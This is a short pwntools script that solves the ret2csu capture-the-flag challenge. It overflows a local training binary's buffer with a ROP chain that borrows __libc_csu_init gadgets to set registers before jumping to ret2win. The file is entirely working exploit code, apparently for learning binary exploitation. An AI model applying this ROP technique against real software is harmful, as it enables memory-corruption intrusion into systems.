from pwn import *

context.log_level = 'debug'
p = process("./ret2csu")

_init = 0x0000000000400560
_init_ptr = 0x0000000000600e38
#from _DYNAMIC
ret2win = 0x00000000004007b1
gadget_1 = 0x000000000040089a
#pop rbx,rbp,r12,r13,r14,r15;ret
gadget_2 = 0x0000000000400880
#mov rdx,r15;mov rsi,r14;mov edi,r13d;call r12p;

payload = 'A'*40
payload += p64(gadget_1)
payload += p64(0)	#rbx
payload += p64(1)	#rbp
payload += p64(_init_ptr)	#r12
payload += p64(0)	#r13
payload += p64(0)	#r14
payload += p64(0xdeadcafebabebeef)
payload += p64(gadget_2)
payload += p64(0)	#add rsp,0x8
payload += p64(0)	#rbx
payload += p64(0)	#rbp
payload += p64(0)	#r12
payload += p64(0)	#r13
payload += p64(0)	#r14
payload += p64(0)	#r15
payload += p64(ret2win)

p.recvuntil(">")
p.sendline(payload)
p.interactive()
